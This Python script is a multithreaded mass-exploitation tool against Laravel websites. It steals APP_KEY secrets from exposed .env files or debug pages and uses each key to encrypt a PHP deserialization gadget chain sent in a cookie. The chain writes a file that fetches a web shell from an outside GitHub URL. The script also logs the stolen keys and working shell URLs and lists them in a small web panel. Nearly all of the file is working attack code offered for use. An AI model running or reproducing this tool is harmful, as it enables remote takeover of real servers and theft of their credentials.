import hmac, hashlib, json, requests, re, threading, sys, os, urllib3
import base64
from hashlib import sha256
from base64 import b64decode, b64encode
from Crypto import Random
from Crypto.Cipher import AES
from queue import Queue
from threading import Thread
from flask import Flask, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

shells_found = []
app = Flask(__name__)

@app.route("/shells", methods=["GET"])
def list_shells():
    return jsonify(shells_found)

def print_banner():
    print("""
\033[95m  _________                            __                 
 /   _____/__ __  ____   ____   _______/  |_  ___________ 
 \_____  \|  |  \/    \ /    \ /  ___/\   __\/ __ \_  __ \\
 /        \  |  /   |  \   |  \\\\___ \  |  | \  ___/|  | \/
/_______  /____/|___|  /___|  /____  > |__|  \___  >__|   
        \/           \/     \/     \/            \/       
\033[92m          Sean - Laravel RCE v2
\033[0m""")

pathname = 'pler.php'
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"];$myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!");$code = "PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcignaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaW50eHBsb2l0L21pbmlzaGVsbC9tYWluL3BsZXIudHh0JywgYmFzZW5hbWUoX19GSUxFX18pKSkgewoJaGVhZGVyKCdMb2NhdGlvbjogJy4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7Cn0gZWxzZSB7CgllY2hvICJVbmtub3duIGVycm9yPGJyPiI7Cn0KPz4=";fwrite($myfile, base64_decode($code));fclose($myfile);echo("Chitoge kirisaki?! Tsundere,kawaii <3");'
exploit_code = 'O:29:"Illuminate\\Support\\MessageBag":2:{s:11:"\x00*\x00messages";a:0:{}s:9:"\x00*\x00format";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\x00*\x00queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"\x00*\x00event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"\x00*\x00config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"\x00*\x00name";s:7:"abcdefg";}s:7:"\x00*\x00code";s:'+str(len(p))+':"'+p+'";}}}}'

BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class AndroXGh0st:
    def encrypt(self, raw, key):
        raw = pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        rawco = cipher.encrypt(raw.encode())
        mac = hmac.new(key, b64encode(iv)+b64encode(rawco), hashlib.sha256).hexdigest()
        data = {
            'iv': b64encode(iv).decode(),
            'value': b64encode(rawco).decode(),
            'mac': mac
        }
        return json.dumps(data)

    def get_env(self, text, url):
        if "APP_KEY" in text:
            match = re.search(r"APP_KEY=([a-zA-Z0-9:;\\/\\\\=$%^&*()\-+_!@#]+)", text)
            if match:
                appkey = match.group(1)
                return appkey.strip('"\'')
        return False

def exploit(url):
    try:
        headers = {'User-agent': 'Mozilla/5.0'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
        resp = get_source if "APP_KEY=" in get_source else None
        method = 'vuln_dotenv.txt' if resp else None
        if not resp:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
                method = 'vuln_postdata.txt'
        if resp:
            getkey = AndroXGh0st().get_env(resp, url)
            if getkey:
                with open(method, 'a') as f:
                    f.write(url + '|' + getkey + '\n')
                api_key = getkey.replace('base64:', '')
                key = b64decode(api_key)
                payload = AndroXGh0st().encrypt(exploit_code, key)
                payload_encoded = b64encode(payload.encode()).decode()
                cookies = {"XSRF-TOKEN": payload_encoded}
                requests.get(url+'/public', cookies=cookies, headers=headers, timeout=8, verify=False)
                shell_check = requests.get(url + '/' + pathname + '?Chitoge', headers=headers, timeout=8, verify=False).text
                if 'Chitoge kirisaki' in shell_check:
                    shell_url = url + '/' + pathname + '?Chitoge'
                    shells_found.append({"target": url, "shell_url": shell_url})
                    with open('shell_results.txt', 'a') as f:
                        f.write(shell_url + '\n')
                    print(f"\033[92m[+] Success: {shell_url}\033[0m")
                else:
                    print(f"\033[91m[-] Failed to confirm shell: {url}\033[0m")
            else:
                print(f"\033[91m[-] Cannot get APP_KEY: {url}\033[0m")
        else:
            print(f"\033[91m[-] Not vulnerable: {url}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error on {url}: {e}\033[0m")

if __name__ == "__main__":
    print_banner()

    print("1. Mass Exploit")
    print("2. Single Check")
    print("3. Web Panel")
    print("0. Exit")
    choice = input("\nChoose option: ").strip()

    if choice == '1':
        filename = input("Enter target list filename (e.g. list.txt): ").strip()
        if not os.path.exists(filename):
            print("\033[91m[-] File not found!\033[0m")
            sys.exit()
        try:
            thread_num = int(input("Enter number of threads (e.g. 10): ").strip())
        except:
            print("\033[91m[-] Invalid thread number.\033[0m")
            sys.exit()

        with open(filename) as f:
            urls = list(set(f.read().splitlines()))  # Remove duplicates

        pool = ThreadPool(thread_num)
        for url in urls:
            if not url.startswith("http"):
                url = "http://" + url
            pool.add_task(exploit, url)
        pool.wait_completion()

    elif choice == '2':
        target = input("Enter single URL to check: ").strip()
        if not target.startswith("http"):
            target = "http://" + target
        exploit(target)

    elif choice == '3':
        print("Running panel on http://127.0.0.1:5000")
        app.run(debug=True)

    else:
        print("Bye!")
